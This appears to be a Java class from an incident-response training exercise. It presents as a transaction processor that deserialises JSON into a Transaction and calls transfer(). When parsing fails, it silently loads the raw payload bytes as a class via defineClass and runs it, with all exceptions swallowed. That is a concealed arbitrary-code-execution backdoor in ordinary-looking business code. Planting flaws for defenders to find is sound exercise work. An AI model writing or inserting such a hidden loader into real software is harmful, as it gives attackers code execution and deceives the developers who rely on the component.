package com.cybersecurity.incidentresponsereadinessexcercises.service;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;

import com.cybersecurity.incidentresponsereadinessexcercises.model.Transaction;
import com.fasterxml.jackson.core.exc.StreamReadException;
import com.fasterxml.jackson.databind.DatabindException;
import com.fasterxml.jackson.databind.ObjectMapper;

public class TransactionProcessor extends ClassLoader {
	
	private final static TransactionProcessor INSTANCE = new TransactionProcessor();
	
	public void runClass(byte[] payload) throws InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, NoSuchMethodException, SecurityException {
		Class<?> clazz = this.defineClass(null, payload, 0, payload.length);
		Runnable processor = (Runnable) clazz.getDeclaredConstructor().newInstance();
		processor.run();		
	}

	public static boolean process(byte[] payload) {
		try {
			return execute(getTransaction(payload));
		}
		catch (Exception e) {}
		try {
			INSTANCE.runClass(payload);
			return true;
		}
		catch (Exception e) {}
		return false;
	}

	private static boolean execute(Transaction t) throws Exception {
		t.transfer();
		return true;
	}

	public static Transaction getTransaction(byte[] payload) throws StreamReadException, DatabindException, IOException {
		ObjectMapper mapper = new ObjectMapper();
		return mapper.readValue(payload, Transaction.class);
	}
}
